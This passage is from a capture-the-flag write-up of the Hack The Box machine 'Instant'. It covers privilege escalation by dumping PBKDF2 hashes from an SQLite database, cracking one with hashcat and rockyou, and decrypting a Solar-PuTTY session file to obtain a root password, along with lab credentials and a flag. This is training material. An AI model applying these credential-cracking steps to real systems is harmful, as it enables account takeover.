Bad Data.
<--- CUT FOR BREVITY --->
```

![](images/2024-10-12_14-49_powershell_decryption.png)

After a few seconds we got `two passwords` for whatever reason but the correct one which worked was `estrella`.

```c
<--- CUT FOR BREVITY --->
Bad Data.

Bad Data.

Bad Data.


[+] Successfully decrypted using password: estrella

-----------------------------------------------------
[+] DONE. Decrypted file is saved in: C:\Users\admin\Desktop\SolarPutty_sessions_decrypted.txt
COMMANDO 10/12/2024 14:41:37
```

![](images/2024-10-12_14-51_powershell_decryption_password.png)

| Password |
| -------- |
| estrella |

![](images/2024-10-12_14-52_solar_putty_session.png)

## Privilege Escalation to root (intended)

### Database Enumeration

We checked the `projects` folder and found a `sqlite3 database` which contained two `PBKDF2` hashes. One for `admin` and one for `shirohige`.

```c
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ ls -la
total 44
drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 .
drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 36864 Sep 30 16:34 instant.db
```

```c
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ strings instant.db 
SQLite format 3
tablewallet_transactionswallet_transactions     CREATE TABLE wallet_transactions (
        id INTEGER NOT NULL, 
        sender VARCHAR, 
        receiver VARCHAR, 
        amount VARCHAR, 
        txn_fee VARCHAR, 
        note VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id)
{tablewallet_walletswallet_wallets
CREATE TABLE wallet_wallets (
        id INTEGER NOT NULL, 
        wallet_id VARCHAR, 
        balance INTEGER, 
        invite_token VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (wallet_id), 
        UNIQUE (invite_token)
indexsqlite_autoindex_wallet_wallets_2wallet_wallets
indexsqlite_autoindex_wallet_wallets_1wallet_wallets
Mtablewallet_userswallet_users
CREATE TABLE wallet_users (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        wallet_id VARCHAR, 
        password VARCHAR, 
        create_date VARCHAR, 
        secret_pin INTEGER, 
        role VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email), 
        UNIQUE (wallet_id)
indexsqlite_autoindex_wallet_users_3wallet_users
indexsqlite_autoindex_wallet_users_2wallet_users
indexsqlite_autoindex_wallet_users_1wallet_users
shirohigeshirohige@instant.htb458715c9-b15e-467b-8a3d-97bc3fcf3c11pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed2024-08-08 20:57:47.909667
]instantianactive
instantAdminadmin@instant.htbf0eca6e5-783a-471d-9d8f-0162cbc900dbpbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd9782024-07-23 00:20:52.529887
U4Adminactive
shirohige
%       instantAdmin
shirohige@instant.htb
/       admin@instant.htb
458715c9-b15e-467b-8a3d-97bc3fcf3c11
U       f0eca6e5-783a-471d-9d8f-0162cbc900db
'458715c9-b15e-467b-8a3d-97bc3fcf3c11shirohige_shi7
)abfc4bd6-e048-4b48-8e33-67d7fa0a6c80paulkapufi_kap9
-0d02a551-8536-415e-8a08-8017a635a08fturafarugaro_tur>
/f0eca6e5-783a-471d-9d8f-0162cbc900db
instant_admin_inv9
-9f3a7cfc-f85a-43d0-84a2-2fd4e04212b3spideymonkey_spi
458715c9-b15e-467b-8a3d-97bc3fcf3c11
abfc4bd6-e048-4b48-8e33-67d7fa0a6c80
0d02a551-8536-415e-8a08-8017a635a08f
U       f0eca6e5-783a-471d-9d8f-0162cbc900db(
9f3a7cfc-f85a-43d0-84a2-2fd4e04212b3
shirohige_shi
paulkapufi_kap
turafarugaro_tur
/       instant_admin_inv
spideymonkey_spi
```

We picked the `hash` for `shirohige` to proceed.

```c
pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

### Cracking the Hash

First of all we needed to put the `hash` into a format which we could use with `hashcat`.

- [https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cryptography.md#pbkdf2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cryptography.md#pbkdf2)

Since the `salt` was already in `ASCII` format, we modified the steps to our needs.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ echo "sha256:600000:$(echo -n YnRgjnim | base64):$(echo c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed | xxd -r -p | base64)"
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=
```

Then we wrote it to a file and `cracked` it using `hashcat`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ cat shirohige.hash 
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ hashcat -a 0 -m 10900 shirohige.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2918/5900 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+s...LFUO0=
Time.Started.....: Sat Oct 12 23:38:46 2024 (5 secs)
Time.Estimated...: Sat Oct 12 23:38:51 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       55 H/s (8.22ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599040-599999
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> freedom
Hardware.Mon.#1..: Util: 94%

Started: Sat Oct 12 23:38:45 2024
Stopped: Sat Oct 12 23:38:52 2024
```

| Password |
| -------- |
| estrella |

### SolarPutty_sessions_decrypted.txt

We `re-used` the `password` for the `import` and also for the `SolarPuttyDecrypt` tool which wrote the `decrypted cleartext password` inside a file called `SolarPutty_sessions_decrypt.txt` on the `Desktop`.

- [https://www.solarwinds.com/de/free-tools/solar-putty](https://www.solarwinds.com/de/free-tools/solar-putty)
- [https://github.com/VoidSec/SolarPuttyDecrypt](https://github.com/VoidSec/SolarPuttyDecrypt)

```c
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}

```

| Username | Password          |
| -------- | ----------------- |
| root     | 12**24nzC!r0c%q12 |

## Privilege Escalation to root

We tried the `password` on `root` and it worked.

```c
shirohige@instant:~$ su -
Password: 
root@instant:~# 
```

## root.txt

```c
root@instant:~# cat root.txt 
5db47e1dd66e7d42a150d06a753937fa
```
